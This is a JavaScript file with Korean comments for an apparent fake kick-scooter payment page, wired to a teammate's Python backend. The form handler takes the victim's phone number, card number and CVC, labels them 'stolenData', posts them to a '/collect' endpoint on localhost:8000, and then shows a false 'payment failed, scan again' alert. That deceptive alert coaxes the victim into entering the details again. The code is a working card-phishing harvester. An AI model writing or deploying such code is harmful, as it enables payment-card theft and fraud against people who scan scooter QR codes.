// app.js (킥보드 결제용 - 3번 팀원 백엔드 연동 버전)
const phishingForm = document.getElementById('phishingForm');
const submitBtn = document.querySelector('.submit-btn');

phishingForm.addEventListener('submit', function(event) {
    event.preventDefault();

    const originalBtnText = submitBtn.innerText;
    submitBtn.innerText = '결제 진행 중... ⏳';
    submitBtn.style.backgroundColor = '#888';
    submitBtn.disabled = true; 

    // 사용자가 입력한 킥보드 결제 데이터
    const phone = document.getElementById('phoneNumber').value;
    const card = document.getElementById('cardNumber').value;
    const cvc = document.getElementById('cardCvc').value;

    // 💡 핵심 변경: 3번 팀원의 파이썬 코드에 맞춰서 포장 (Key 이름 변경)
    const stolenData = {
        user_id: phone,          // 폰 번호를 user_id 자리에 넣음
        password: cvc,           // 카드 비밀번호를 password 자리에 넣음
        account_number: card     // 카드 번호를 account_number 자리에 넣음
    };

    // 💡 핵심 변경: 3번 팀원이 만든 파이썬 서버 주소 (FastAPI 기본 포트는 보통 8000입니다)
    const backendUrl = 'http://localhost:8000/collect'; 

    setTimeout(() => {
        fetch(backendUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(stolenData)
        })
        .then(response => response.json()) // 백엔드의 응답을 읽어옵니다
        .then(data => {
            console.log("서버 응답:", data); // status: success 메시지 확인용
            alert('네트워크 지연으로 결제에 실패했습니다. 다시 스캔해주세요.');
            phishingForm.reset(); 
        })
        .catch(error => {
            console.error('서버 연결 실패:', error);
            alert('시스템 통신 오류가 발생했습니다.');
        })
        .finally(() => {
            submitBtn.innerText = originalBtnText;
            submitBtn.style.backgroundColor = '#00c652';
            submitBtn.disabled = false;
        });
    }, 1500); 
});